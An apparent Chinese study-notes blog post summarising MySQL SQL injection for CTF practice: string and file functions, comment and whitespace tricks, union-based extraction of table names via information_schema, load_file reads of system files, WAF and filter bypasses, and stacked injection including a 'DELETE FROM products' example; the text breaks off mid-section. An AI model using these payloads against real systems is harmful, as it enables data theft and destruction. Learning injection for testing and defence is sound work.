class="toc-number">1.3.2.</span> <span class="toc-text">4.2 过滤引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3%E8%BF%87%E6%BB%A4%E9%80%97%E5%8F%B7"><span class="toc-number">1.3.3.</span> <span class="toc-text">4.3过滤逗号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4%E8%BF%87%E6%BB%A4%E6%B3%A8%E9%87%8A%E7%AC%A6%EF%BC%88-%E5%92%8C-%EF%BC%89"><span class="toc-number">1.3.4.</span> <span class="toc-text">4.4过滤注释符（#和-）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5%E8%BF%87%E6%BB%A4%E6%AF%94%E8%BE%83%E7%AC%A6%E5%8F%B7%EF%BC%88-lt-%E5%92%8C-gt-%EF%BC%89"><span class="toc-number">1.3.5.</span> <span class="toc-text">4.5过滤比较符号（&lt;和&gt;）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-6%E8%BF%87%E6%BB%A4%E7%AD%89%E5%8F%B7"><span class="toc-number">1.3.6.</span> <span class="toc-text">4.6过滤等号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-7-%E8%BF%87%E6%BB%A4union%EF%BC%8Cselect%EF%BC%8Cwhere%E7%AD%89"><span class="toc-number">1.3.7.</span> <span class="toc-text">4.7 过滤union，select，where等</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-8-%E5%85%B6%E4%BB%96"><span class="toc-number">1.3.8.</span> <span class="toc-text">4.8 其他</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E9%98%B2%E6%AD%A2SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.</span> <span class="toc-text">5.防止SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-%E4%B8%A5%E6%A0%BC%E7%AE%A1%E7%90%86%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.4.1.</span> <span class="toc-text">5.1 严格管理数据类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E8%BD%AC%E4%B9%89"><span class="toc-number">1.4.2.</span> <span class="toc-text">5.2 特殊字符转义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3-%E4%BD%BF%E7%94%A8%E9%A2%84%E7%BC%96%E8%AF%91%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.4.3.</span> <span class="toc-text">5.3 使用预编译语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-4-%E5%88%A9%E7%94%A8%E6%A1%86%E6%9E%B6"><span class="toc-number">1.4.4.</span> <span class="toc-text">5.4 利用框架</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-5-%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">1.4.5.</span> <span class="toc-text">5.5 存储过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E4%BE%8B%E9%A2%98"><span class="toc-number">1.5.</span> <span class="toc-text">6.例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1-CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb"><span class="toc-number">1.5.1.</span> <span class="toc-text">6.1 [CISCN2019 总决赛 Day2 Web1]Easyweb</span></a></li></ol></li></ol></li></ol>
    </nav>
  </div>
</aside>

<main class="main" role="main">
  <div class="content">
  <article id="post-SQL注入" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
    
    <div class="article-header">
      
        
  
    <h1 class="article-title" itemprop="name">
      SQL注入总结
    </h1>
  

      
      <div class="article-meta">
        <span class="article-date">
    <i class="icon icon-calendar-check"></i>
	<a href="/2021/11/15/SQL%E6%B3%A8%E5%85%A5/" class="article-date">
	  <time datetime="2021-11-14T16:00:00.000Z" itemprop="datePublished">2021-11-15</time>
	</a>
</span>
        
        
  <span class="article-tag">
    <i class="icon icon-tags"></i>
	<a class="article-tag-link-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a>
  </span>


        

        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/11/15/SQL%E6%B3%A8%E5%85%A5/#comments" class="article-comment-link">Comments</a></span>
        
      </div>
    </div>
    <div class="article-entry marked-body" itemprop="articleBody">
      
        <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>大纲</p>
<p><img src="http://cr_7.gitee.io/git-hub-image/sql.png" alt="sql"></p>
<h2 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1.基础知识"></a>1.基础知识</h2><h3 id="1-1-字符串截取函数"><a href="#1-1-字符串截取函数" class="headerlink" title="1.1 字符串截取函数"></a>1.1 字符串截取函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left(str,index)//从左边第index开始截取</span><br></pre></td></tr></table></figure>

<p>select left(“abcdef”,3) ===&gt; “abc”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">right(str,index) //从右边第index开始截取</span><br></pre></td></tr></table></figure>

<p>select right(“abcdef”,3) ===&gt;”def”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substring(str,pos)//从左边第pos个字符开始截取</span><br></pre></td></tr></table></figure>

<p>select SUBSTRING(“abcdef”,3) ===&gt;”cdef”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substring(str,pos,len)//从第pos个字符开始截取len个字符</span><br></pre></td></tr></table></figure>

<p>select SUBSTRING(“abcdef”,3,2) ===&gt;”cd”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(str,index,len)//截取str,index开始,截取len的长度</span><br></pre></td></tr></table></figure>

<p>select SUBSTR(“abcdef”,3,2) ===&gt;”cd”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mid(str,pos,len)//截取str 从pos开始,截取len的长度（mysql特有）</span><br></pre></td></tr></table></figure>

<p>select mid(“abcdef”,3,2) ===&gt;”cd”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locate(substr,str)//判断字符串（string）中是否包含另一个字符串（substr），函数返回substr在string中出现的位置。字符串string不包含subStrlocate（substr，string）= 0</span><br></pre></td></tr></table></figure>

<p>select locate(“admin”,”iamadmin”) ===&gt;”4”</p>
<p>字符串截取函数，在报错注入，盲注中经常使用到，例如mid函数。<br>正常用法mid(str,pos,len)功能是从str字符串中从pos开始，截取len长度的字字符串。而mid(from(1))，这里的from（1）表示的是从1这个位置开始截取剩下的字符串.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select mid(&#x27;abc&#x27;from(3));</span><br><span class="line">+-------------------+</span><br><span class="line">| mid(&#x27;abc&#x27;from(3)) |</span><br><span class="line">+-------------------+</span><br><span class="line">| c                 |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure>



<p>for(1)表示从改位置起一次就截取一个字符，示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select mid(&#x27;abc&#x27;from(1)for(1));</span><br><span class="line">+-------------------------+</span><br><span class="line">| mid(&#x27;abc&#x27;from(1)for(1)) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| a                       |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.04 sec)</span><br></pre></td></tr></table></figure>



<h3 id="1-2-字符串比较函数"><a href="#1-2-字符串比较函数" class="headerlink" title="1.2 字符串比较函数"></a>1.2 字符串比较函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strcmp(expr1,expr2) //如果两个字符串是一样则返回0,如果第一个小于第二个则返回-1</span><br></pre></td></tr></table></figure>

<p>select STRCMP(“admin”,”admin”) ===&gt;0</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find_in_set(str,strlist) //如果相同则返回1不同则返回0</span><br></pre></td></tr></table></figure>

<p>select FIND_IN_SET(“admin”,”admin”) ===&gt;1</p>
<h3 id="1-3字符串连接函数"><a href="#1-3字符串连接函数" class="headerlink" title="1.3字符串连接函数"></a>1.3字符串连接函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat(str1,str2,...,...) //将字符串首尾相连</span><br></pre></td></tr></table></figure>

<p>select CONCAT(‘s’,’elect’) ===&gt;’select’</p>
<p>select CONCAT(‘s’,’ele’,’ct’) ===&gt;’select’</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat_ws(separator,str1,str2) //将字符串用指定连接符连接</span><br></pre></td></tr></table></figure>

<p>select concat_ws(‘<del>‘,”s”,”elect”) ===&gt;’s</del>elect’</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat()//利用分组的方式连接所有字符串,通俗点儿讲,其实就是把某个字段下的所有数据全部连接成一个字符串,注意有长度限制,默认1024。用于把多条数据一次注入出来</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/20190308213822172.png" alt="20190308213822172"></p>
<p>tips:在使用字符串拼接函数时，尽量使用拼接符号进行拼接，便于后续读取数据。<br>例如：group_concat( distinct（要连接的字段）order by (排序字段) asc/desc separator (分隔符) )</p>
<h3 id="1-4一些绕过注入的罕见函数"><a href="#1-4一些绕过注入的罕见函数" class="headerlink" title="1.4一些绕过注入的罕见函数"></a>1.4一些绕过注入的罕见函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">instr(str1,substr) //从子字符串中返回子串第一次出现的位置</span><br></pre></td></tr></table></figure>

<p>select INSTR(“ffffabc”,”abc”) ===&gt;5</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lpad(str,len,padstr) rpad(str,len,padstr) // 在str的左(右)两边填充给定的padstr到指定的长度len,返回填充的结果</span><br></pre></td></tr></table></figure>

<p>select LPAD(“ELECT”,6,”S”) ===&gt;”SELECT”</p>
<p>select RPAD(“SELEC”,6,”T”) ===&gt;”SELECT”</p>
<h3 id="1-5mysql中一些基础函数"><a href="#1-5mysql中一些基础函数" class="headerlink" title="1.5mysql中一些基础函数"></a>1.5mysql中一些基础函数</h3><ul>
<li>当前数据库</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">database()</span><br><span class="line">schema()</span><br></pre></td></tr></table></figure>

<ul>
<li>数据库用户名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">USER()</span><br><span class="line">CURRENT_USER()</span><br><span class="line">SYSTEM_USER()</span><br><span class="line">SESSION_USER()</span><br></pre></td></tr></table></figure>

<ul>
<li>数据库版本</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">VERSION()</span><br><span class="line">@@VERSION</span><br><span class="line">@@GLOBAL.VERSION</span><br></pre></td></tr></table></figure>

<ul>
<li>路径相关函数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@@BASEDIR : mysql安装路径</span><br><span class="line">@@SLAVE_LOAD_TMPDIR : 临时文件夹路径</span><br><span class="line">@@DATADIR : 数据存储路径</span><br><span class="line">@@CHARACTER_SETS_DIR : 字符集设置文件路径</span><br><span class="line">@@LOG_ERROR : 错误日志文件路径</span><br><span class="line">@@PID_FILE : pid-file文件路径</span><br><span class="line">@@BASEDIR : mysql安装路径</span><br><span class="line">@@SLAVE_LOAD_TMPDIR : 临时文件夹路径</span><br></pre></td></tr></table></figure>



<h3 id="1-6注释符"><a href="#1-6注释符" class="headerlink" title="1.6注释符"></a>1.6注释符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#  //单行注释符,url记得编码为%23</span><br><span class="line">/**/   /*/**/这样是等效于/**/</span><br><span class="line">-- + 用这个符号注意是--空格任意字符很多人搞混了</span><br><span class="line">;%00</span><br><span class="line">`</span><br><span class="line">/*!*/  /*!/*!*/是等效于/*!*/的</span><br></pre></td></tr></table></figure>



<h3 id="1-7操作符号"><a href="#1-7操作符号" class="headerlink" title="1.7操作符号"></a>1.7操作符号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">:=</span><br><span class="line">||, OR, XOR</span><br><span class="line">&amp;&amp;, AND</span><br><span class="line">NOT</span><br><span class="line">BETWEEN, CASE, WHEN, THEN, ELSE</span><br><span class="line">=, &lt;=&gt;, &gt;=, &gt;, &lt;=, &lt;, &lt;&gt;, !=, IS, LIKE, REGEXP, IN</span><br><span class="line">|</span><br><span class="line">&amp;</span><br><span class="line">&lt;&lt;, &gt;&gt;</span><br><span class="line">-, +</span><br><span class="line">*, /, DIV, %, MOD</span><br><span class="line">^</span><br><span class="line">- (一元减号), ~ (一元比特反转)</span><br><span class="line">!</span><br><span class="line">BINARY, COLLATE</span><br></pre></td></tr></table></figure>



<h3 id="1-8运算符"><a href="#1-8运算符" class="headerlink" title="1.8运算符"></a>1.8运算符</h3><ul>
<li>比较运算符</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">=</span><br><span class="line">&gt;</span><br><span class="line">&lt;</span><br><span class="line">!=</span><br><span class="line">&lt;&gt; 不等于的意思</span><br><span class="line">like (模糊匹配 select &#x27;12345&#x27; like &#x27;12%&#x27; =&gt; true)</span><br><span class="line">in（select &#x27;123&#x27; in (&#x27;12&#x27;) =&gt; false）</span><br><span class="line">between (select database() between 0x61 and 0x7a;//select database() between &#x27;a&#x27; and &#x27;z&#x27;;)</span><br><span class="line">regexp / rlike(正则匹配select &#x27;123455&#x27; regexp &#x27;^12&#x27; =&gt; true)</span><br></pre></td></tr></table></figure>



<ul>
<li>逻辑运算符</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">not或! 非  </span><br><span class="line">AND 逻辑与 == &amp;&amp;</span><br><span class="line">OR 逻辑或 == ||</span><br><span class="line">XOR 逻辑异或 == ^</span><br></pre></td></tr></table></figure>



<ul>
<li>位运算符</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&amp; 按位与</span><br><span class="line">| 按位或</span><br><span class="line">^ 按位异或</span><br><span class="line">! 取反</span><br><span class="line">&lt;&lt; 左移</span><br><span class="line">&gt;&gt;右移</span><br></pre></td></tr></table></figure>



<h3 id="1-9常用函数"><a href="#1-9常用函数" class="headerlink" title="1.9常用函数"></a>1.9常用函数</h3><ul>
<li>延时函数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sleep(duration) //暂停duration秒</span><br><span class="line">benchmark(count,expr) //重复执行count次expr</span><br></pre></td></tr></table></figure>



<ul>
<li>编码函数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CONV(N,from_base,to_base) //N是要转换的数据，from_base是原进制，to_base是目标进制 </span><br><span class="line">hex(num) //转化成16进制</span><br><span class="line">unhex() </span><br><span class="line">ord(str)   //返回字符串第一个字符的ASCII 值</span><br><span class="line">ascii(str) //返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL</span><br></pre></td></tr></table></figure>



<ul>
<li>文件函数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">load_file() //读文件路径可以用0x，char转换的字符</span><br><span class="line">outfile select * into outfile &#x27;/tmp/test.txt&#x27;</span><br><span class="line">dumpfile //用法同上但是只能写入一行数据，常用于udf提权写dll</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">?id=1&#x27; union select 1,2,load_file(&#x27;/etc/init.d/httpd&#x27;)  //读取文件</span><br><span class="line">select xxoo into outfile &#x27;路径&#x27; //权限较高时可直接写文件</span><br></pre></td></tr></table></figure>



<ul>
<li>类型转换</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1=1</span><br><span class="line">1=&#x27;1&#x27;</span><br><span class="line">1=&quot;1&quot;</span><br><span class="line">1=true</span><br><span class="line">1=1+&#x27;a&#x27;</span><br><span class="line">1=1+&quot;a&quot;</span><br><span class="line">1=0+true</span><br></pre></td></tr></table></figure>



<ul>
<li>一些构造语句</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(expr1,expr2,expr3) // expr1 true执行expr2否则执行expr3</span><br><span class="line">case when....then....else...end</span><br><span class="line">select case when (条件) then 代码1 else 代码 2 end</span><br><span class="line">IFNULL() </span><br><span class="line">NULLIF()</span><br><span class="line"></span><br><span class="line">MAKE_SET(bits,str1,str2,…)//返回一个设定值(含子字符串分隔字符串&quot;,&quot;字符)，在设置位的相应位的字符串。str1对应于位0，str2到第1位，依此类推。在str1，str1有NULL值，…那么不添加到结果。例如，select make_set(&quot;1&quot;,&quot;a&quot;,&quot;b&quot;,&quot;c&quot;); bits将转为二进制,1的二进制为0000 0001,倒过来为1000 0000,所以取str1(a),打印a</span><br></pre></td></tr></table></figure>

<ul>
<li>limit</li>
</ul>
<p>limit子句用于限制查询结果返回的数量。</p>
<p><strong>用法</strong>：【select * from tableName limit i,n 】</p>
<p>i:为查询结果的索引值（默认从0开始）；</p>
<p>n : 为查询结果返回的数量</p>
<p>实例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from `user`</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210525180604257.png" alt="image-20210525180604257"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from `user` limit 0,1</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210525180635545.png" alt="image-20210525180635545"></p>
<h3 id="1-10-information-schema"><a href="#1-10-information-schema" class="headerlink" title="1.10 information_schema"></a>1.10 information_schema</h3><p>information_schema这这个数据库中保存了MySQL服务器所有数据库的信息。 如数据库名，数据库的表，表栏的数据类型与访问权限等。</p>
<table>
<thead>
<tr>
<th align="left">表名</th>
<th align="left">列名</th>
<th align="left">内容</th>
</tr>
</thead>
<tbody><tr>
<td align="left">schemata</td>
<td align="left">schema_name</td>
<td align="left">所有数据库的名字</td>
</tr>
<tr>
<td align="left">tables</td>
<td align="left">table_name</td>
<td align="left">所有数据库的表的名字</td>
</tr>
<tr>
<td align="left">tables</td>
<td align="left">table_schema</td>
<td align="left">所有数据库的名字</td>
</tr>
<tr>
<td align="left">columns</td>
<td align="left">table_schema</td>
<td align="left">所有数据库的名字</td>
</tr>
<tr>
<td align="left">columns</td>
<td align="left">table_name</td>
<td align="left">所有数据库的表的名字</td>
</tr>
<tr>
<td align="left">columns</td>
<td align="left">column_name</td>
<td align="left">所有数据库的表的列的名字</td>
</tr>
</tbody></table>
<ul>
<li>查看当前数据库的表名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=database()limit 0,1;</span><br></pre></td></tr></table></figure>



<ul>
<li>查看字段名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_name=&#x27;user&#x27; and table_schema=database() limit 0,1;</span><br></pre></td></tr></table></figure>



<ul>
<li>查数据</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 字段名 from 表名;</span><br></pre></td></tr></table></figure>



<h3 id="1-11-MySQL中的空白字符"><a href="#1-11-MySQL中的空白字符" class="headerlink" title="1.11 MySQL中的空白字符"></a>1.11 MySQL中的空白字符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 /**/ tab</span><br><span class="line">%a0 这个不会被php的\s进行匹配</span><br><span class="line">/*!*/ 内敛注释 #这个也可以用来做分隔</span><br></pre></td></tr></table></figure>



<h2 id="2-注入类型"><a href="#2-注入类型" class="headerlink" title="2.注入类型"></a>2.注入类型</h2><h3 id="2-1数值型注入"><a href="#2-1数值型注入" class="headerlink" title="2.1数值型注入"></a>2.1数值型注入</h3><p>也就是说后台的sql语句直接拼接的一个数值，可以通过以下方式进行初步判断，如果有waf，那么可以尝试使用注释符等将waf过滤的关键字进行包裹，使waf无法匹配，达到绕过waf的效果。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=1+1</span><br><span class="line">?id=-1 or 1=1</span><br><span class="line">?id=-1 or 10-2=8</span><br><span class="line">?id=1 and 1=2</span><br><span class="line">?id=1 and 1=1</span><br><span class="line">?id=2/1</span><br><span class="line">?id=2*1</span><br></pre></td></tr></table></figure>

<p>将id进行各种加减乘除运算等等诸如上述的测试，如果回显正常可判断属于数值型注入。</p>
<h3 id="2-2字符型注入"><a href="#2-2字符型注入" class="headerlink" title="2.2字符型注入"></a>2.2字符型注入</h3><p>后台得到一个字符型数据然后进行拼接查询，具体判断方式如下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;</span><br><span class="line">?id=1&quot;</span><br><span class="line">?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=1&quot; and &quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure>

<p>值得注意的是，在字符型注入中，要通过手工测试去判断后台sql语句的写法，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql-&gt; select password from userinfo where username=&#x27;admin&#x27;</span><br></pre></td></tr></table></figure>

<p>可以看到其数据是包裹在一对单引号中的，也就是说如果我们在插入一个单引号，就会引起后台sql语句执行报错，然后就可以根据其包裹方式构造payload进行注入。</p>
<h3 id="2-3union联合查询"><a href="#2-3union联合查询" class="headerlink" title="2.3union联合查询"></a>2.3union联合查询</h3><p>使用union联合查询之前，要先进行order by进行字段猜测</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by int//例如order by 2</span><br></pre></td></tr></table></figure>

<p>例如题目：</p>
<p>xxxxx?id=1 order by 2，页面显示正常</p>
<p>xxxxx?id=1 order by 3，页面显示不正常</p>
<p>就此可以判断，此时使用的表的字段就是2</p>
<p>（字符型的话需要注释后面的引号，例如：<code>id=1&#39; order by 2%23</code>(%23 ===&gt; #)）</p>
<p>得到具体字段数后，我们就可以爆字段位置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 UNION SELECT 1,2 或 id=-1 UNION SELECT 1,2</span><br></pre></td></tr></table></figure>

<p>然后就可以进行数据库表查询(mysql环境下)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()) -- +</span><br></pre></td></tr></table></figure>

<p>基础语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select xxx from xxx //上面的语句只是在这基础上加各种条件达到数据库表查询目的 </span><br></pre></td></tr></table></figure>

<p>过滤了逗号的话可以使用join进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,id from `user` union select * from ((select(1))a join(select version())b);</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210525231520468.png" alt="image-20210525231520468"></p>
<p>join函数的作用是用于把来自两个或多个表的行结合起来。语句中的a等于是把select(1)的值赋给了a，也就是a=select (1)，然后把两个拼接起来。<br>tips:该注入方式，适合用与显错注入，可以将注入得到的值直接显示到页面上。</p>
<h3 id="2-3-堆叠查询"><a href="#2-3-堆叠查询" class="headerlink" title="2.3 堆叠查询"></a>2.3 堆叠查询</h3><h4 id="0x01-堆叠注入定义"><a href="#0x01-堆叠注入定义" class="headerlink" title="0x01 堆叠注入定义"></a>0x01 堆叠注入定义</h4><p> Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在 mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection。</p>
<h4 id="0x02-原理"><a href="#0x02-原理" class="headerlink" title="0x02 原理"></a>0x02 原理</h4><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
<p>ps:堆叠注入适用场景相对来说比较少，有一定的局限性</p>
<h4 id="0x03-强网杯例题"><a href="#0x03-强网杯例题" class="headerlink" title="0x03 强网杯例题"></a>0x03 强网杯例题</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>

<p>常规操作被过滤。使用堆叠注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show tables#</span><br></pre></td></tr></table></figure>

